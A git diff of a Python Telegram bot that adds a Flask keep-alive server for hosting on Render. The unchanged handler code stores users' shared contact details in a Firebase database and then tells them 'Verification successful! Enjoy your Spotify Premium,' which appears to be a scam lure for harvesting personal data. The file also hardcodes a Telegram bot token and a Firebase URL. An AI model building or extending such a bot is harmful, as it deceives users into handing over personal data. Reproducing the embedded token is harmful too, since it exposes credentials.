@@ -1,11 +1,24 @@
 import telebot
 from datetime import datetime
 import requests
+import os
+import threading
+from flask import Flask
 
+# Flask dummy server taaki Render service active rahe
+app = Flask(__name__)
+
+@app.route('/')
+def home():
+    return "Bot is running 24/7!"
+
+def run_flask():
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
+
+# Telegram Bot Setup
 TOKEN = "8023731366:AAHUlCDM7HHAYcAQO28Ef_qOjZC4kbxgND4"
 bot = telebot.TeleBot(TOKEN)
-
-# Nayi Firebase Realtime Database URL update kar di gayi hai
 FIREBASE_URL = "https://saidul-89666-default-rtdb.firebaseio.com"
 
 @bot.message_handler(commands=['start'])
@@ -32,13 +45,18 @@ def contact_handler(message):
         try:
             url = f"{FIREBASE_URL}/users/{user_key}.json"
             response = requests.put(url, json=user_data)
-            print(f"Firebase Response Status: {response.status_code}")
-            print(f"Firebase Response Text: {response.text}")
+            print(f"Firebase Status: {response.status_code}")
         except Exception as e:
-            print(f"Firebase Connection Error: {e}")
+            print(f"Firebase Error: {e}")
 
         remove_markup = telebot.types.ReplyKeyboardRemove()
         bot.send_message(message.chat.id, "Verification successful! Enjoy your Spotify Premium.", reply_markup=remove_markup)
 
-print("Bot is running with new Firebase Database...")
-bot.infinity_polling(none_stop=True)
+if __name__ == "__main__":
+    # Flask ko background thread mein start karein
+    t = threading.Thread(target=run_flask)
+    t.daemon = True
+    t.start()
+    
+    print("Bot is running online on Render...")
+    bot.infinity_polling(none_stop=True)
